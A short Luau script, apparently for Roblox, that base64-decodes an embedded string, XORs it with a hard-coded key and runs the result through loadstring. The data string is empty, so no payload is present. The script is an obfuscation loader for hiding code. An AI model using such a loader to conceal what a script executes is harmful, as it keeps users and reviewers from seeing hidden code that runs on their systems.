
local bit32 = bit32
local KEY = {31,120,125,249,125,27,208,148,106,229,43,177,247,133,110,29,179,14,77,74,223,83,46,5,110,119,73,67,233,114,60,174}
local DATA_B64 = ""
local chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local map={}
for i=1,#chars do map[string.sub(chars,i,i)]=i-1 end
local function dec(s)
 local out={}; local buf=0; local bits=0
 for i=1,#s do local c=string.sub(s,i,i); if c~="=" then local v=map[c]; if v then buf=bit32.bor(bit32.lshift(buf,6),v); bits+=6; if bits>=8 then bits-=8; out[#out+1]=string.char(bit32.band(bit32.rshift(buf,bits),255)); buf=bit32.band(buf,bit32.lshift(1,bits)-1) end end end end
 return table.concat(out)
end
local encrypted=dec(DATA_B64); local out=table.create(#encrypted)
for i=1,#encrypted do out[i]=string.char(bit32.bxor(string.byte(encrypted,i),KEY[((i-1)%#KEY)+1])) end
local fn,err=loadstring(table.concat(out))
if not fn then error("Encrypted payload failed to load: "..tostring(err)) end
return fn()
